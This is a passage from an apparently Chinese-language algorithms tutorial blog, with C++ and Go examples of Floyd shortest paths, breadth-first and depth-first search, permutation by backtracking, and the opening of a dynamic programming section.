<h4 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h4><p>使用距离矩阵，从第一个顶点开始，计算所有两个点通过1点的路径是否是最短。然后再从第二个顶点开始，同样计算所有两个点的路径是否是最短，直到所有点计算完毕，得到的距离矩阵即为最短路径。</p>
<p>示例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> InputFileName <span class="string">&quot;../input.txt&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按行返回数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">readFile</span><span class="params">(string &amp;input)</span> </span>&#123;</span><br><span class="line">    input = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="type">static</span> ifstream <span class="title">inFile</span><span class="params">(InputFileName)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inFile) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Failed to open file %s&quot;</span>, InputFileName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!inFile.<span class="built_in">eof</span>()) &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">        inFile.<span class="built_in">getline</span>(buf, <span class="number">128</span>);</span><br><span class="line">        input = <span class="built_in">string</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将字母转成数字</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getIndex</span><span class="params">(<span class="type">char</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将数字转成字母</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">getChar</span><span class="params">(<span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//由于已知点数量，第一行废掉</span></span><br><span class="line">    string inputStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">readFile</span>(inputStr) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Read file error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义距离矩阵</span></span><br><span class="line">    <span class="type">int</span> distance[<span class="number">6</span>][<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">//初始化所有距离为-1</span></span><br><span class="line">            distance[i][j] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//自己到自己为0</span></span><br><span class="line">        distance[i][i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    map&lt;string, string&gt; road;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">readFile</span>(inputStr) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="built_in">getIndex</span>(inputStr[<span class="number">0</span>]);      <span class="comment">//第一个点</span></span><br><span class="line">        <span class="type">int</span> b = <span class="built_in">getIndex</span>(inputStr[<span class="number">2</span>]);      <span class="comment">//第二个点</span></span><br><span class="line">        <span class="type">int</span> c = <span class="built_in">stoi</span>(inputStr.<span class="built_in">substr</span>(<span class="number">3</span>));   <span class="comment">//距离</span></span><br><span class="line">        <span class="comment">//赋值给距离矩阵</span></span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;%c--%c: %d&quot;</span>, <span class="built_in">getChar</span>(a), <span class="built_in">getChar</span>(b), c);</span><br><span class="line">        distance[a][b] = c;</span><br><span class="line">        <span class="comment">//添加到路由表</span></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">2</span>] = &#123;<span class="built_in">getChar</span>(a), <span class="built_in">getChar</span>(b)&#125;;</span><br><span class="line">        road[tmp] = <span class="built_in">string</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; ++k) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">                <span class="comment">//添加key</span></span><br><span class="line">                <span class="type">char</span> tmp[<span class="number">3</span>] = &#123;<span class="built_in">getChar</span>(i), <span class="built_in">getChar</span>(j), <span class="number">0x00</span>&#125;;</span><br><span class="line">                <span class="comment">//防止路径遗漏，补充路由表</span></span><br><span class="line">                <span class="keyword">if</span> (distance[i][j] != <span class="number">-1</span> &amp;&amp; road.<span class="built_in">count</span>(tmp) == <span class="number">0</span>) &#123;</span><br><span class="line">                    road[tmp] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//可通过k到达i且可通过k到达j</span></span><br><span class="line">                <span class="keyword">if</span> (distance[i][k] != <span class="number">-1</span> &amp;&amp; distance[k][j] != <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="comment">//ij之间没有通路或者当前计算的最短路径大于通过k到达的距离</span></span><br><span class="line">                    <span class="keyword">if</span> (distance[i][j] == <span class="number">-1</span> ||</span><br><span class="line">                        distance[i][j] &gt; distance[i][k] + distance[k][j]) &#123;</span><br><span class="line">                        distance[i][j] = distance[i][k] + distance[k][j];</span><br><span class="line">                        <span class="comment">//更新路由表</span></span><br><span class="line">                        <span class="type">char</span> tmp1[<span class="number">3</span>] = &#123;<span class="built_in">getChar</span>(i), <span class="built_in">getChar</span>(k), <span class="number">0x00</span>&#125;;</span><br><span class="line">                        <span class="type">char</span> tmp2[<span class="number">3</span>] = &#123;<span class="built_in">getChar</span>(k), <span class="built_in">getChar</span>(j), <span class="number">0x00</span>&#125;;</span><br><span class="line">                        string tmpRoad = road[tmp1];</span><br><span class="line">                        tmpRoad.<span class="built_in">pop_back</span>();     <span class="comment">//防止重复字母</span></span><br><span class="line">                        road[tmp] = tmpRoad + road[tmp2];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j) &#123;</span><br><span class="line">            <span class="built_in">PRINT</span>(<span class="string">&quot;%d\t&quot;</span>, distance[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">PRINT</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印结果</span></span><br><span class="line">    <span class="built_in">PRINT</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; <span class="number">6</span>; ++m) &#123;</span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">3</span>] = &#123;<span class="built_in">getChar</span>(m), <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = <span class="built_in">getChar</span>(i);</span><br><span class="line">            <span class="built_in">LOG_INFO</span>(<span class="string">&quot;%c-&gt;%c %s: %d&quot;</span>, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>], road[tmp].<span class="built_in">c_str</span>(), distance[m][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-bfs-（Breadth-First-Search）广度优先遍历"><a href="#3-bfs-（Breadth-First-Search）广度优先遍历" class="headerlink" title="3. bfs （Breadth-First Search）广度优先遍历"></a>3. bfs （Breadth-First Search）广度优先遍历</h2><ul>
<li>广度优先算法比较适合带环的图的最短路径，需要使用seen标记某个点是否被访问过</li>
</ul>
<h3 id="3-1-二叉树的广度优先遍历"><a href="#3-1-二叉树的广度优先遍历" class="headerlink" title="3.1. 二叉树的广度优先遍历"></a>3.1. 二叉树的广度优先遍历</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	value <span class="type">int</span></span><br><span class="line">	left  *TreeNode</span><br><span class="line">	right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bfs</span><span class="params">(root *TreeNode)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> queue list.List</span><br><span class="line">	queue.PushBack(&amp;root)</span><br><span class="line">	<span class="keyword">for</span> queue.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		node := queue.Front().Value.(*TreeNode)</span><br><span class="line">		queue.Remove(queue.Front())</span><br><span class="line">		<span class="keyword">if</span> node.left != <span class="literal">nil</span> &#123;</span><br><span class="line">			queue.PushBack(node.left)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> node.right != <span class="literal">nil</span> &#123;</span><br><span class="line">			queue.PushBack(node.right)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(node.value)	<span class="comment">// 这里取值</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-方格中找两点最短路径"><a href="#3-2-方格中找两点最短路径" class="headerlink" title="3.2. 方格中找两点最短路径"></a>3.2. 方格中找两点最短路径</h3><ul>
<li>两格之间步数为1，<code>#</code>作为墙不可走</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> pointT <span class="keyword">struct</span> &#123;</span><br><span class="line">	x <span class="type">int</span></span><br><span class="line">	y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	<span class="comment">// 按照上下左右的相对位置设定，用于后面方便找四周的点</span></span><br><span class="line">	kRoundPoints = [][]<span class="type">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">		&#123;<span class="number">-1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回从src到dst的最短路径长度，带层间隔版本</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bfsFloor</span><span class="params">(src pointT, dst pointT, grid []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="comment">// 减小计算量，走过的路不再走，记录一下哪里走过了</span></span><br><span class="line">	seen := <span class="built_in">make</span>([][]<span class="type">bool</span>, <span class="built_in">len</span>(grid))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> seen &#123;</span><br><span class="line">		seen[i] = <span class="built_in">make</span>([]<span class="type">bool</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>]))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 源地址记录走过了，注意x是第二维的坐标</span></span><br><span class="line">	seen[src.y][src.x] = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用层数作为步数</span></span><br><span class="line">	curDepth := <span class="number">0</span></span><br><span class="line">	<span class="keyword">var</span> queue list.List</span><br><span class="line">	<span class="comment">// 插入源地址，作为第一层，使用nil作为层间隔</span></span><br><span class="line">	queue.PushBack(src)</span><br><span class="line">	queue.PushBack(<span class="literal">nil</span>)</span><br><span class="line">	<span class="comment">// 队列一定含有一个层间隔，不在头就在尾，如果只剩一个层间隔，说明没路可走</span></span><br><span class="line">	<span class="keyword">for</span> queue.Len() &gt; <span class="number">1</span> &#123;</span><br><span class="line">		tmp := queue.Front().Value</span><br><span class="line">		queue.Remove(queue.Front())</span><br><span class="line">		<span class="keyword">if</span> tmp == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="comment">// 找到层间隔，说明当前层遍历完了，步数加一准备下一层</span></span><br><span class="line">			curDepth++</span><br><span class="line">			<span class="comment">// 当前层遍历完，队列剩余的都是下一层，加入一个层间隔</span></span><br><span class="line">			queue.PushBack(<span class="literal">nil</span>)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 判断当前点是不是目标点，如果是，说明走到了，返回步数</span></span><br><span class="line">		tx, ty := tmp.(pointT).x, tmp.(pointT).y</span><br><span class="line">		<span class="keyword">if</span> tx == dst.x &amp;&amp; ty == dst.y &#123;</span><br><span class="line">			<span class="keyword">return</span> curDepth</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 不是目标点，从此点出发，向四周走一下</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> kRoundPoints &#123;</span><br><span class="line">			px, py := tx+kRoundPoints[i][<span class="number">0</span>], ty+kRoundPoints[i][<span class="number">1</span>]</span><br><span class="line">			<span class="comment">// 如果超出边界或者已经走过了或者碰到墙，就继续</span></span><br><span class="line">			<span class="keyword">if</span> py &lt; <span class="number">0</span> || py &gt;= <span class="built_in">len</span>(grid) || px &lt; <span class="number">0</span> || px &gt;= <span class="built_in">len</span>(grid[<span class="number">0</span>]) || seen[py][px] || grid[py][px] == <span class="string">&#x27;#&#x27;</span> &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 这个点可以走，走上去，记录到队列中，作为下一层的起点</span></span><br><span class="line">			seen[py][px] = <span class="literal">true</span></span><br><span class="line">			queue.PushBack(pointT&#123;px, py&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> pointST <span class="keyword">struct</span> &#123;</span><br><span class="line">	x    <span class="type">int</span></span><br><span class="line">	y    <span class="type">int</span></span><br><span class="line">	step <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回从src到dst的最短路径长度</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bfs</span><span class="params">(src pointST, dst pointST, grid []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="comment">// 减小计算量，走过的路不再走，记录一下哪里走过了</span></span><br><span class="line">	seen := <span class="built_in">make</span>([][]<span class="type">bool</span>, <span class="built_in">len</span>(grid))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> seen &#123;</span><br><span class="line">		seen[i] = <span class="built_in">make</span>([]<span class="type">bool</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>]))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 源地址记录走过了，注意x是第二维的坐标</span></span><br><span class="line">	seen[src.y][src.x] = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> queue list.List</span><br><span class="line">	<span class="comment">// 插入源地址</span></span><br><span class="line">	queue.PushBack(src)</span><br><span class="line">	<span class="keyword">for</span> queue.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		tmp := queue.Front().Value.(pointST)</span><br><span class="line">		queue.Remove(queue.Front())</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 判断当前点是不是目标点，如果是，说明走到了，返回步数</span></span><br><span class="line">		<span class="keyword">if</span> tmp.x == dst.x &amp;&amp; tmp.y == dst.y &#123;</span><br><span class="line">			<span class="keyword">return</span> tmp.step</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 不是目标点，从此点出发，向四周走一下</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> kRoundPoints &#123;</span><br><span class="line">			px, py := tmp.x+kRoundPoints[i][<span class="number">0</span>], tmp.y+kRoundPoints[i][<span class="number">1</span>]</span><br><span class="line">			<span class="comment">// 如果超出边界或者已经走过了或者碰到墙，就继续</span></span><br><span class="line">			<span class="keyword">if</span> py &lt; <span class="number">0</span> || py &gt;= <span class="built_in">len</span>(grid) || px &lt; <span class="number">0</span> || px &gt;= <span class="built_in">len</span>(grid[<span class="number">0</span>]) || seen[py][px] || grid[py][px] == <span class="string">&#x27;#&#x27;</span> &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 这个点可以走，走上去，记录到队列中，作为下一层的起点</span></span><br><span class="line">			seen[py][px] = <span class="literal">true</span></span><br><span class="line">			queue.PushBack(pointST&#123;px, py, tmp.step+<span class="number">1</span>&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		@ # . . *</span></span><br><span class="line"><span class="comment">		. . . # .</span></span><br><span class="line"><span class="comment">		# . . . .</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	grid := []<span class="type">string</span>&#123;<span class="string">&quot;@#..*&quot;</span>, <span class="string">&quot;...#.&quot;</span>, <span class="string">&quot;#....&quot;</span>&#125;</span><br><span class="line">	<span class="comment">// @ 到 * 的最短距离为6</span></span><br><span class="line">	fmt.Println(bfs(pointST&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, pointST&#123;<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, grid))</span><br><span class="line">	fmt.Println(bfsFloor(pointT&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, pointT&#123;<span class="number">4</span>, <span class="number">0</span>&#125;, grid))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-dfs-（Depth-First-Search）深度优先遍历"><a href="#4-dfs-（Depth-First-Search）深度优先遍历" class="headerlink" title="4. dfs （Depth-First Search）深度优先遍历"></a>4. dfs （Depth-First Search）深度优先遍历</h2><ul>
<li>dfs一般需要使用递归，可以用于无环图的最短路径查找，可以使用上一步走过的节点来防止重入</li>
</ul>
<h3 id="4-1-获取无环图的两个节点之间的路径"><a href="#4-1-获取无环图的两个节点之间的路径" class="headerlink" title="4.1. 获取无环图的两个节点之间的路径"></a>4.1. 获取无环图的两个节点之间的路径</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 起点、终点、上一个点，关系</span></span><br><span class="line"><span class="comment">// cb调用的是所有路上的节点，调用顺序是从e到s，因为dfs从最深处返回</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(s, e, last <span class="type">int</span>, rel [][]<span class="type">int</span>, cb <span class="keyword">func</span>(n <span class="type">int</span>)</span></span>) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> s == e &#123;</span><br><span class="line">		cb(e)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 从起点出发，所有能走的点走一遍</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> rel[s] &#123;</span><br><span class="line">		<span class="comment">// 上一次就是这个点，不能回去</span></span><br><span class="line">		<span class="comment">// 或此路不通，继续</span></span><br><span class="line">		<span class="keyword">if</span> v == last || !dfs(v, e, s, rel, cb) &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 此路可以到达，将当前点输出出去</span></span><br><span class="line">		cb(s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 都到不了</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">				 1</span></span><br><span class="line"><span class="comment">			   /   \</span></span><br><span class="line"><span class="comment">			  2     3</span></span><br><span class="line"><span class="comment">			 /\    / \</span></span><br><span class="line"><span class="comment">			4  5  0   6</span></span><br><span class="line"><span class="comment">			  / \</span></span><br><span class="line"><span class="comment">			 7   8</span></span><br><span class="line"><span class="comment">			/</span></span><br><span class="line"><span class="comment">		   9</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// 关系图，代表某个点和哪个点连接</span></span><br><span class="line">	rel := [][]<span class="type">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">3</span>&#125;,       <span class="comment">// 0</span></span><br><span class="line">		&#123;<span class="number">2</span>, <span class="number">3</span>&#125;,    <span class="comment">// 1</span></span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;, <span class="comment">// 2</span></span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>&#125;, <span class="comment">// 3</span></span><br><span class="line">		&#123;<span class="number">2</span>&#125;,       <span class="comment">// 4</span></span><br><span class="line">		&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>&#125;, <span class="comment">// 5</span></span><br><span class="line">		&#123;<span class="number">3</span>&#125;,       <span class="comment">// 6</span></span><br><span class="line">		&#123;<span class="number">5</span>, <span class="number">9</span>&#125;,    <span class="comment">// 7</span></span><br><span class="line">		&#123;<span class="number">5</span>&#125;,       <span class="comment">// 8</span></span><br><span class="line">		&#123;<span class="number">7</span>&#125;,       <span class="comment">// 9</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	road := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">	dfs(<span class="number">4</span>, <span class="number">6</span>, <span class="number">-1</span>, rel, <span class="function"><span class="keyword">func</span><span class="params">(n <span class="type">int</span>)</span></span> &#123; road = <span class="built_in">append</span>(road, n) &#125;)</span><br><span class="line">	fmt.Println(road) <span class="comment">// 6 3 1 2 4</span></span><br><span class="line"></span><br><span class="line">	road = road[:<span class="number">0</span>]</span><br><span class="line">	dfs(<span class="number">4</span>, <span class="number">4</span>, <span class="number">-1</span>, rel, <span class="function"><span class="keyword">func</span><span class="params">(n <span class="type">int</span>)</span></span> &#123; road = <span class="built_in">append</span>(road, n) &#125;)</span><br><span class="line">	fmt.Println(road) <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line">	road = road[:<span class="number">0</span>]</span><br><span class="line">	dfs(<span class="number">9</span>, <span class="number">8</span>, <span class="number">-1</span>, rel, <span class="function"><span class="keyword">func</span><span class="params">(n <span class="type">int</span>)</span></span> &#123; road = <span class="built_in">append</span>(road, n) &#125;)</span><br><span class="line">	fmt.Println(road) <span class="comment">// 8 5 7 9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-全排列算法（回溯法）"><a href="#5-全排列算法（回溯法）" class="headerlink" title="5. 全排列算法（回溯法）"></a>5. 全排列算法（回溯法）</h2><img src = "2020_04_29_01.png">

<ul>
<li>原理是遍历替换首字母和后面的字符，替换到最后输出</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全排列</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">permutation</span><span class="params">(str []<span class="type">byte</span>, index <span class="type">int</span>, f <span class="keyword">func</span>(str []<span class="type">byte</span>)</span></span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(str) == index &#123;</span><br><span class="line">        <span class="comment">// 这里输出结果</span></span><br><span class="line">		f(str)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 不交换的场景</span></span><br><span class="line">	permutation(str, index+<span class="number">1</span>, f)</span><br><span class="line">	<span class="comment">// index对应位置向后交换</span></span><br><span class="line">	<span class="keyword">for</span> i := index + <span class="number">1</span>; i &lt; <span class="built_in">len</span>(str); i++ &#123;</span><br><span class="line">		str[i], str[index] = str[index], str[i]</span><br><span class="line">		permutation(str, index+<span class="number">1</span>, f)</span><br><span class="line">		str[i], str[index] = str[index], str[i]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-动态规划"><a href="#6-动态规划" class="headerlink" title="6. 动态规划"></a>6. 动态规划</h2><ul>
<li>动态规划一般是推导真实场景的某一状态和下一状态之间的关系</li>
<li>根据两个状态的关系列出方程，然后从第一个状态不断向状态n靠近</li>
</ul>
<h3 id="6-1-背包算法"><a href="#6-1-背包算法" class="headerlink" title="6.1. 背包算法"></a>6.1. 背包算法</h3><h4 id="1-01背包"><a href="#1-01背包" class="headerlink" title="1) 01背包"></a>1) 01背包</h4><ul>
<li>主要解决选元素的方案数的问题</li>
